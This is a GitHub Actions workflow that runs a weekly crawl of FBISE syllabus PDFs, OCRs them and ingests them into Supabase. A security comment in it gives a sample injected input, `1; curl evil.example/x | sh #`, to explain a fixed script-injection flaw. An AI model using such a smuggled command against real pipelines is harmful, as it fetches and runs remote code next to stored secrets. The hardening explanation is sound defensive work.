name: Weekly FBISE Syllabus Crawl

on:
  # Runs every Monday at 02:00 UTC.
  # GitHub will email the repo owner on any job failure automatically.
  schedule:
    - cron: '0 2 * * 1'

  # Also allow manual triggering from the Actions tab (useful for testing).
  workflow_dispatch:
    inputs:
      dry_run:
        description: 'Dry run (download + parse only, no ingest)'
        required: false
        default: 'false'
        type: choice
        options:
          - 'false'
          - 'true'
      force:
        description: 'Force re-process all sources (ignore checksums)'
        required: false
        default: 'false'
        type: choice
        options:
          - 'false'
          - 'true'
      limit:
        description: 'Max sources to process (blank = all)'
        required: false
        default: ''
        type: string

jobs:
  crawl-and-ingest:
    name: Crawl FBISE PDFs and ingest into Supabase
    runs-on: ubuntu-latest
    timeout-minutes: 120  # OCR can be slow; 2 hours is a safe ceiling

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          # This job never pushes back to the repo, so the default GITHUB_TOKEN doesn't need
          # to survive in the local git config for later steps (or a compromised third-party
          # action) to read.
          persist-credentials: false

      - name: Set up Node.js 20
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      # Install system Tesseract for faster OCR (Tesseract.js falls back to
      # its bundled WASM binary if this is absent, but the native binary is ~5x faster).
      - name: Install system Tesseract OCR
        run: |
          sudo apt-get update -q
          sudo apt-get install -y tesseract-ocr tesseract-ocr-urd

      # Both this step and the one below used to interpolate `${{ github.event.inputs.* }}`
      # and `${{ steps.flags.outputs.flags }}` directly into a `run:` shell block. That
      # substitution happens at workflow-template-render time, before the shell ever sees the
      # script — so a manually-triggered `limit` input containing shell metacharacters (e.g.
      # `1; curl evil.example/x | sh #`) would splice in as literal new shell statements, not
      # as inert text, with SUPABASE_SERVICE_ROLE_KEY sitting in env two steps later. Routing
      # the same values through `env:` and referencing them as `$VAR` instead fixes this:
      # env-block values arrive as opaque runtime strings the shell can only ever treat as
      # data, never re-parse as script source.
      - name: Build crawl flags
        id: flags
        env:
          DRY_RUN_INPUT: ${{ github.event.inputs.dry_run }}
          FORCE_INPUT: ${{ github.event.inputs.force }}
          LIMIT_INPUT: ${{ github.event.inputs.limit }}
        run: |
          FLAGS=""
          if [ "$DRY_RUN_INPUT" = "true" ]; then
            FLAGS="$FLAGS --dry-run"
          fi
          if [ "$FORCE_INPUT" = "true" ]; then
            FLAGS="$FLAGS --force"
          fi
          if [ -n "$LIMIT_INPUT" ]; then
            FLAGS="$FLAGS --limit $LIMIT_INPUT"
          fi
          echo "flags=$FLAGS" >> "$GITHUB_OUTPUT"

      - name: Run FBISE crawler
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          EMBEDDING_API_KEY: ${{ secrets.EMBEDDING_API_KEY }}
          CRAWL_FLAGS: ${{ steps.flags.outputs.flags }}
          # NODE_ENV is not set to production so tsx can resolve devDependencies.
        run: |
          npm run crawl -- $CRAWL_FLAGS

      # Upload the crawl state file as an artifact so you can inspect it
      # in the Actions UI to see which URLs were processed and their checksums.
      - name: Upload crawl state artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: crawl-state-${{ github.run_id }}
          path: data/.crawl-state.json
          if-no-files-found: ignore
          retention-days: 30
